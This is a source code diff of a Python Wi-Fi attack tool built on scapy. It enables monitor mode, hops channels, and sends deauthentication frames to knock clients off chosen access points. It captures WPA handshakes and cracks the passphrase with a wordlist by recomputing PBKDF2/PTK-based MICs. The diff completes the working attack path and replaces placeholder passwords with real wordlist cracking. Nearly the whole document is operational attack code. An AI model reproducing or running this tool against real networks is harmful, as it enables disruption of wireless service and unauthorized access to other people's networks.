@@ -1,9 +1,6 @@
-# from re import S
-from os import system, geteuid
-from scapy.layers.dot11 import Dot11Elt, Dot11, RadioTap, Dot11Deauth #, TO_DS
-from scapy.layers.eap import EAPOL, EAP
-# from scapy.packet import Dot11
-from scapy.config import conf
+from os import system, geteuid, listdir
+from scapy.layers.dot11 import Dot11Elt, Dot11, RadioTap, Dot11Deauth
+from scapy.layers.eap import EAPOL
 from scapy.all import Raw, sniff, sendp
 from socket import if_nameindex
 from InquirerPy import prompt
@@ -13,29 +10,49 @@ from threading import Thread
 from binascii import hexlify, unhexlify, a2b_hex
 from hashlib import pbkdf2_hmac, sha1
 from hmac import new as newHmac
+from time import sleep
 
 interface = None
 pointer = INQUIRERPY_FILL_CIRCLE_SEQUENCE
 SSIDList = {}
+currentChannel = 0
+forceChannel = -1
 
 class APInfo:
-    def __init__(self, BSSID, name):
+    def __init__(self, BSSID, name, channel):
         self.BSSID = BSSID
         self.name = name
-        self.handshakeToFrames = []
-        self.handshakeFromFrames = []
+        self.channel = channel
+
+        self.packets = []
         self.capturedHandshake = False
 
-    def storeHandshakeFrame(self, frame):
+        self.clientHandshakes = {}
+
+    def storeHandshakeFrame(self, packet):
         if self.capturedHandshake: return
 
-        if frame.FCfield.to_DS and len(self.handshakeToFrames) < 2: # Client => Access Point
-            self.handshakeToFrames.append(frame)
-        elif not frame.FCfield.to_DS and len(self.handshakeFromFrames) < 2: # Access Point => Client
-            self.handshakeFromFrames.append(frame)
+        clientMac = packet.addr1 if packet.addr2 == self.BSSID else packet.addr2
 
-        self.capturedHandshake = len(self.handshakeFromFrames) == 2 and len(self.handshakeToFrames) == 2
-        if self.capturedHandshake: color_print([("green", f"Captured handshake for network \"{self.BSSID} : {self.name}\"")])
+        if clientMac not in self.clientHandshakes.keys():
+            self.clientHandshakes[clientMac] = [packet]
+        elif packet[0].load != self.clientHandshakes[clientMac][0].load:
+            self.clientHandshakes[clientMac].append(packet)
+            self.capturedHandshake = True
+            self.packets = self.clientHandshakes[clientMac]
+            color_print([("green", f"Captured handshake for network \"{self.BSSID} : {self.name}\"")])
+
+def channelThread():
+    global currentChannel
+    global forceChannel
+
+    while True:
+        for i in range(1, 30):
+            channel = i if forceChannel == -1 else forceChannel
+            if forceChannel == -1 or currentChannel != forceChannel:
+                if system(f"iwconfig {interface} freq {channel} > /dev/null 2>&1") == 0:
+                    sleep(0.5)
+                    currentChannel = channel
 
 def sniffThread():
     sniff(iface=interface, prn=sniffCallback, store=0)
@@ -61,9 +78,9 @@ def sniffCallback(packet):
         global SSIDList
 
         if BSSID in SSIDList.keys(): return
-        SSIDList[BSSID] = APInfo(BSSID, SSID.decode('ascii'))
+        SSIDList[BSSID] = APInfo(BSSID, SSID.decode('ascii'), int(ord(packet[Dot11Elt:3].info)))
 
-    if packet.haslayer(EAPOL) and BSSID in SSIDList.keys():
+    if packet.haslayer(EAPOL) and BSSID in SSIDList.keys() and (DestMAC == BSSID or SrcMAC == BSSID):
         SSIDList[BSSID].storeHandshakeFrame(packet)
 
 def doAttack():
@@ -92,7 +109,13 @@ def doAttack():
     packet = RadioTap()/dot11/Dot11Deauth(reason=7)
 
     # Send the packet:
-    sendp(packet, inter=0.1, count=50, iface=interface, verbose=0)
+    global forceChannel
+    
+    forceChannel = SSIDList[targetMac].channel
+    while currentChannel != forceChannel: pass
+    # sleep(10)
+    sendp(packet, inter=1, count=5, iface=interface, verbose=1)
+    forceChannel = -1
 
 def doCrack():
     back = "Back to Main Menu"
@@ -102,35 +125,48 @@ def doCrack():
         color_print([("red", "No handshakes captured yet")])
         return
         
-    result = prompt({ "message": "Select Captured Handshake to Crack:", "type": "list", "choices": [back] + [f"# {mac} : {info.name}" for mac, info in SSIDList.items() if info.capturedHandshake], "pointer": pointer })
+    result = prompt({ "message": "Select Captured Handshake to Crack:", "type": "list", "choices": [back] + capturedList, "pointer": pointer })
     if result[0] == back: return
+    targetMac = result[0][2:19]
+
+    wordlistsPath = "./wordlists/"
+    result = prompt({ "message": "Select Wordlist", "type": "list", "choices": [back] + [f"# {x}" for x in listdir(wordlistsPath)], "pointer": pointer })
+    if result[0] == back: exit()
+
+    wordlist = open(wordlistsPath + result[0][2:], 'r', encoding='latin-1')
+    words = wordlist.readlines()
+    wordlist.close()
+    wordcount = len(words)
+    words = (word.rstrip('\n') for word in words)
 
     print("Cracking password...")
-    targetMac = result[0][2:19]
     info = SSIDList[targetMac]
 
     # Build key data field
     pke = b"Pairwise key expansion"
-    apMac = unhexlify(info.handshakeFromFrames[0].addr2.replace(':','',5))
-    clientMac = unhexlify(info.handshakeFromFrames[0].addr1.replace(':','',5))
-    anonce = info.handshakeFromFrames[0].load[13:45]
-    snonce = info.handshakeToFrames[0].load[13:45]
+    apMac = unhexlify(info.packets[0].addr2.replace(':','',5))
+    clientMac = unhexlify(info.packets[0].addr1.replace(':','',5))
+    anonce = info.packets[0].load[13:45]
+    snonce = info.packets[1].load[13:45]
 
     keyData = min(apMac, clientMac) + max(apMac, clientMac) + min(anonce, snonce) + max(anonce, snonce)
-    print(keyData)
+    
     # Sniffed MIC
-    sniffedMessageIntegrityCheck = hexlify(info.handshakeToFrames[0][Raw].load)[154:186]
+    sniffedMessageIntegrityCheck = hexlify(info.packets[1][Raw].load)[154:186]
 
     # WPA data field with zeroed MIC
-    wpaData = hexlify(bytes(info.handshakeToFrames[0][EAPOL]))
+    wpaData = hexlify(bytes(info.packets[1][EAPOL]))
     wpaData = wpaData.replace(sniffedMessageIntegrityCheck, b"0" * 32)
     wpaData = a2b_hex(wpaData)
 
-    passwords = ["19481948","yarab"]
-    for password in passwords:
+    for i, password in enumerate(words):
+        if i % 1000 == 0: print(f"Tried {i}/{wordcount}...", end='\r')
+
+        try: password = password.encode("latin")
+        except UnicodeEncodeError: continue
+
         # Calculate Pairwise Master Key
-        pairwiseMasterKey = pbkdf2_hmac('sha1', password.encode('ascii'), info.name.encode('ascii'), 4096, 32)
-        print(pairwiseMasterKey)
+        pairwiseMasterKey = pbkdf2_hmac('sha1', password, info.name.encode('ascii'), 4096, 32)
 
         # Calculate Pairwise Transient Key
         blen = 64
@@ -145,19 +181,14 @@ def doCrack():
         pairwiseTransientKey = R[:blen]
 
         # Calculate password MIC
-        passwordMessageIntegrityCheck = newHmac(pairwiseMasterKey[0:16], wpaData, "sha1").hexdigest()
-        print(passwordMessageIntegrityCheck)
-        print(sniffedMessageIntegrityCheck)
-        print(sniffedMessageIntegrityCheck.decode())
-        # Compare the MICs
-        # if passwordMessageIntegrityCheck[:-8] == sniffedMessageIntegrityCheck.decode():
-        print(passwordMessageIntegrityCheck[:-8] == sniffedMessageIntegrityCheck.decode())
+        passwordMessageIntegrityCheck = newHmac(pairwiseTransientKey[0:16], wpaData, "sha1").hexdigest()
         
-    # checkPassword(info)
-
-# def checkPassword(apInfo, password):
-
-
+        # Compare the MICs
+        if passwordMessageIntegrityCheck[:-8] == sniffedMessageIntegrityCheck.decode():
+            color_print([("green", f"Password is \"{password.decode()}\"!                ")])
+            return
+    
+    color_print([("red", f"Password not found...")])
 
 
 def main():
@@ -173,16 +204,15 @@ def main():
     interface = result[0][2:]
 
     print("Turning interface into monitor mode...")
-    # system(f"ifconfig {interface} down")
-    # system(f"iwconfig {interface} mode monitor")
-    # system(f"iwconfig {interface} freq 10")
-    # system(f"ifconfig {interface} up")
+    system(f"ifconfig {interface} down")
+    system(f"iwconfig {interface} mode monitor")
+    system(f"ifconfig {interface} up")
     # system("airmon-ng check kill")
     # system(f"airmon-ng start {interface}")
     print("Interface turned into monitor mode!")
 
+    Thread(target=channelThread, daemon=True).start()
     Thread(target=sniffThread, daemon=True).start()
-    # sniff(iface=interface, prn=sniffCallback, store=0)
 
     while True:
         attack = "DeAuth WiFi Networks"
@@ -193,5 +223,4 @@ def main():
         elif result[0] == crack: doCrack()
         else: quit()
 
-if __name__ == "__main__":
-    main()
+if __name__ == "__main__": main()
